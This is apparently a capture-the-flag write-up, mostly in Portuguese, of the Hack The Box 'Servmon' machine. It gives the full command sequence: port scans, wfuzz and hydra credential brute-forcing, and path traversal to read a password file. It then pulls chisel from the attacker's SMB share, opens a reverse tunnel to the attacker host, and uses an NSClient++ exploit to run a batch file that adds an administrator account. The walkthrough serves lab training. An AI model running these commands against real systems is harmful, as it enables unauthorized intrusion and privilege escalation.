Servmon
========================

# Enumeration

    sudo nmap_enum servmon.htb | tee nmap_output.txt

![qownnotes-media-ddeyaE](../../../media/qownnotes-media-ddeyaE.png)

    sudo nmap -p- -Pn -T5 -n servmon.htb | tee nmap_fullportstcp_output.txt

![qownnotes-media-mAvaex](../../../media/qownnotes-media-mAvaex.png)

    firefox http://servmon.htb

    searchsploit nvm
        
![qownnotes-media-nDmAyt](../../../media/qownnotes-media-nDmAyt.png)


    searchsploit nsclient
    
![qownnotes-media-DZgreB](../../../media/qownnotes-media-DZgreB.png)


    wfuzz -c -z file,/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt --hc 403 -t 16 https://servmon.htb:8443/auth/token?password=FUZZ 2>&1 | tee "tcp_port_protocol_wfuzz.txt"
    
![qownnotes-media-ZzHQYJ](../../../media/qownnotes-media-ZzHQYJ.png)

    
    wfuzz -c -z file,/usr/share/wordlists/rockyou.txt --hc 403 -t 16 https://servmon.htb:8443/auth/token?password=FUZZ 2>&1 | tee "tcp_port_protocol_wfuzz.txt"


Null session
 
    smbclient -L //10.10.10.184
    
    smbclient -L //10.10.10.184 -N -U ''

![qownnotes-media-JjiIBI](../../../media/qownnotes-media-JjiIBI.png)

    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn 10.10.10.180 | tee nmap_udp_output.txt

![qownnotes-media-YwWUzD](../../../media/qownnotes-media-YwWUzD.png)

    nikto -host http://servmon.htb -T x 6
    
![qownnotes-media-SUFTCz](../../../media/qownnotes-media-SUFTCz.png)


    nikto -host https://servmon.htb:8443 -T x 6
    

    gobuster dir -u https://servmon.htb:8443 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -k -t 16 -o "tcp_port_8443_protocol_gobuster.txt"
    

ACHEI O ENTRY POINT

    ftp -a -A 10.10.10.184

Baixei todo o conteudo

![qownnotes-media-tliVOW](../../../media/qownnotes-media-tliVOW.png)



![qownnotes-media-vDDsKS](../../../media/qownnotes-media-vDDsKS.png)

# Exploitation

Nao deu certo

    hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.10.184 ssh
    

Entao ficou assim: 

1) Visto que uma funcionaria deixou um arquivo chamado Password.txt no Desktop do Usuario Nathan, abusei do path traversal ...
 ![qownnotes-media-HWZvit](../../../media/qownnotes-media-HWZvit.png)
![qownnotes-media-mtFoYr](../../../media/qownnotes-media-mtFoYr.png)


2) Obtive credenais para entrar via SSH
    
    hydra -L users.txt -P passwords.txt 10.10.10.184 ssh
    
![qownnotes-media-GaQGLl](../../../media/qownnotes-media-GaQGLl.png)

![qownnotes-media-kiDxLA](../../../media/qownnotes-media-kiDxLA.png)

3) Depois que consegui entrar, percebi que tinha um servico pelo qual a gente poderia subir privilegio. Entao bora la...
    
    searchsploit nsclient

![qownnotes-media-uGKCFK](../../../media/qownnotes-media-uGKCFK.png)


# Privilege Escalation

Com isso eu ja teria acesso administrativo no servico do nsclient, porem esse servico so era acessado via localhost. Partiu fazer redirecinoamento de porta

![qownnotes-media-PiXHva](../../../media/qownnotes-media-PiXHva.png)

Tentei baixar o chisel, mas nao consegui, porque existia uma politica na maquina que nao permitia acessar o conteudo compartilhado de outra maquina sem autenticacao... para resolver isso usei os seguintes comandos:


    net use \\10.10.14.4\smb test123 /user:user
    # Vale considerar que a sintaxe do comando eh: net use \\ip\share senha /user:nome_usuario
    
    copy \\10.10.14.4\smb\chisel.exe c.exe
![qownnotes-media-MJazdm](../../../media/qownnotes-media-MJazdm.png)


    c.exe client 10.10.14.4:7777 R:8443:127.0.0.1:8443

    Na maquina do atacante ficou:
    
    ./chisel server -p 7777 --socks5 --reverse
    
Nesse caso eu ja conseguia interagi com o servico. Como eu ja tinha senha deste, soh utilizei um exploit para executar uma tarefa de adicao de usuario na maquina, porque eu nao conseguia subir uma shell reversa por conta do antivirus que estava bloqueando.


    cat adduser.bat
    @echo off
    net user john P@ssword123 /add
    net localgroup Administrators john /add


    python exploit.py -t 127.0.0.1 -P 8443 -p ew2x6SsGTxjRwXOT -c 'c:\temp\adduser.bat'

![qownnotes-media-qZcVmX](../../../media/qownnotes-media-qZcVmX.png)


    ssh john@10.10.10.184
    P@ssword123<ENTER>
    
 ![qownnotes-media-LWchOQ](../../../media/qownnotes-media-LWchOQ.png)

![qownnotes-media-DbaOWJ](../../../media/qownnotes-media-DbaOWJ.png)

Fim de papo.